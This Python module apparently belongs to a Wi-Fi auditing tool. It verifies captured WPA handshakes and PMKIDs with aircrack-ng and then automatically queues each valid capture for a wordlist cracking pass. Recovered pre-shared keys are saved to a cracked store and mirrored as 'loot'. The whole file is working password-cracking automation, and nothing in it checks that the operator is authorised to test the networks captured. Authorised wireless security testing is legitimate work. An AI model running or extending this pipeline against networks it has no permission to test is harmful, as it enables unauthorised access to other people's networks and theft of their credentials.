"""Post-capture handshake / PMKID validity verification + auto-crack.

Runs aircrack-ng against the raw 802.1X pcaps that capture.py records and
patches the corresponding handshakes.json sightings with a checked/valid flag
so the operator knows a capture is actually crackable (EAPOL 4-way or PMKID)
rather than just sighted. Gracefully degrades to a no-op when aircrack-ng is
absent.

Every capture that verifies as usable is queued for an auto-crack pass
(aircrack-ng -w <wordlist>); recovered PSKs land in the cracked store and
are stamped back onto the handshake sighting. Cracking runs on its own worker
so a long wordlist pass never stalls verification of fresh captures.
"""

import os
import re
import queue
import subprocess
import threading
import time

from . import config
from . import linuxutil
from . import state

MAX_PCAP = 256 * 1024 * 1024      # skip absurd captures
TIMEOUT = 40                      # aircrack-ng run budget (seconds)
_WORK_DELAY = 1.0

_NETWORK_RE = re.compile(r'WPA\s*\(\s*(\d+)\s+handshake([^)]*)\)', re.I)
_KEY_RE = re.compile(r'KEY FOUND!\s*\[\s*(.*?)\s*\]')


def _run_aircrack(path):
    try:
        return subprocess.run(
            ['aircrack-ng', path],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            timeout=TIMEOUT)
    except Exception:
        return None


def _parse_counts(text):
    """Pull handshake/PMKID counts from aircrack-ng's network table.

    aircrack-ng prints one table row per network: `WPA (1 handshake)` or
    `WPA (0 handshake, with PMKID)`. The PMKID presence is a flag, never a
    count, so both numbers come from the same rows.
    """
    rows = _NETWORK_RE.findall(text or '')
    hs = sum(int(a) for a, _ in rows)
    pm = sum(1 for _, tail in rows if 'PMKID' in tail.upper())
    return hs, pm


class VerifyEngine(object):
    def __init__(self):
        self._stop = threading.Event()
        self._thread = None
        self._queue = queue.Queue()
        self._enabled = linuxutil.have('aircrack-ng')
        self._crack_queue = queue.Queue(maxsize=8)
        self._crack_thread = None
        self._no_wl_warned = False

    def _marker(self, path):
        return path + '.verified'

    def enqueue(self, path):
        if not self._enabled:
            return
        if not path or not os.path.isfile(path):
            return
        if os.path.exists(self._marker(path)):
            return
        if os.path.getsize(path) > MAX_PCAP:
            return
        try:
            self._queue.put_nowait(path)
        except queue.Full:
            pass

    def seed(self):
        """Re-verify pcaps left over from a previous run."""
        if not self._enabled:
            return
        try:
            names = sorted(os.listdir(config.PCAP_DIR))
        except OSError:
            return
        for name in names:
            if not name.lower().endswith('.pcap'):
                continue
            self.enqueue(os.path.join(config.PCAP_DIR, name))

    def _verify(self, path):
        proc = _run_aircrack(path)
        try:
            os.makedirs(config.PCAP_DIR, exist_ok=True)
        except OSError:
            pass
        if proc is None:
            return
        text = proc.stdout.decode('utf-8', 'replace')
        hs, pm = _parse_counts(text)
        now = time.strftime('%Y-%m-%d %H:%M:%S UTC')
        base = os.path.basename(path)
        fields = {
            'checked': True,
            'valid': bool(hs or pm),
            'handshakes': hs,
            'pmkids': pm,
            'verified': now,
        }
        n = state.update_handshakes(
            lambda e: (e.get('file') or '') == path
            or (e.get('file') or '').endswith('/' + base),
            fields)
        try:
            with open(self._marker(path), 'w') as fh:
                fh.write('rc=%s hs=%s pmkid=%s\n' % (proc.returncode, hs, pm))
        except OSError:
            pass
        if n:
            state.emit('VERIFY', 'capture verified: %s — %s' % (
                base, 'crackable (%d handshake, %d PMKID)' % (hs, pm)
                if fields['valid'] else 'no usable handshake/PMKID'))
        if fields['valid']:
            self._queue_crack(path)

    # --- auto-crack ----------------------------------------------------------
    def _queue_crack(self, path):
        """Queue a wordlist pass for a verified capture (dropped when full)."""
        if not (self._enabled and config.CRACK_ENABLED):
            return
        try:
            self._crack_queue.put_nowait(path)
        except queue.Full:
            pass

    def _crack(self, path):
        wl = state.crack_wordlist()
        if not wl:
            if not self._no_wl_warned:
                self._no_wl_warned = True
                state.emit('ALERT', 'auto-crack: no wordlist found — '
                           'install rockyou or set Settings → crack wordlist')
            return
        bssid, ssid = '', ''
        base = os.path.basename(path)
        for e in state.read_handshakes():
            f = (e.get('file') or '')
            if f == path or f.endswith('/' + base):
                bssid = e.get('bssid') or ''
                ssid = e.get('ssid') or ''
                break
        argv = ['aircrack-ng', '-w', wl, '-q']
        if bssid:
            argv += ['-b', bssid]
        argv.append(path)
        try:
            proc = subprocess.run(argv, stdout=subprocess.PIPE,
                                   stderr=subprocess.STDOUT,
                                   timeout=config.CRACK_TIMEOUT)
        except Exception:
            return
        m = _KEY_RE.search(proc.stdout.decode('utf-8', 'replace'))
        if not m:
            state.emit('INFO', 'auto-crack: wordlist exhausted for %s' % base)
            return
        psk = m.group(1).strip()
        state.update_handshakes(
            lambda e: (e.get('file') or '') == path
            or (e.get('file') or '').endswith('/' + base),
            {'cracked': psk})
        state.append_cracked({
            'ssid': ssid, 'bssid': bssid, 'psk': psk,
            'source': 'aircrack', 'file': path})
        state.emit('CRACK', 'PSK recovered: %s = "%s" (%s)' % (
            ssid or bssid or base, psk, base))
        state.mirror_loot()

    def _crack_work(self):
        while not self._stop.is_set():
            try:
                path = self._crack_queue.get(timeout=_WORK_DELAY)
            except queue.Empty:
                continue
            try:
                self._crack(path)
            except Exception as exc:
                state.emit('ALERT', 'auto-crack error: %s' % exc)
            self._crack_queue.task_done()

    def _work(self):
        while not self._stop.is_set():
            try:
                path = self._queue.get(timeout=_WORK_DELAY)
            except queue.Empty:
                continue
            try:
                self._verify(path)
            except Exception as exc:
                state.emit('ALERT', 'capture verify error: %s' % exc)
            self._queue.task_done()

    def start(self):
        self._stop.clear()
        if not self._enabled:
            return
        self._thread = threading.Thread(target=self._work, daemon=True)
        self._thread.start()
        if config.CRACK_ENABLED:
            self._crack_thread = threading.Thread(target=self._crack_work,
                                                  daemon=True)
            self._crack_thread.start()
        self.seed()

    def stop(self):
        self._stop.set()
        if self._thread:
            self._thread.join(timeout=3)
            self._thread = None
        if self._crack_thread:
            self._crack_thread.join(timeout=3)
            self._crack_thread = None

    def running(self):
        return self._thread is not None and self._thread.is_alive()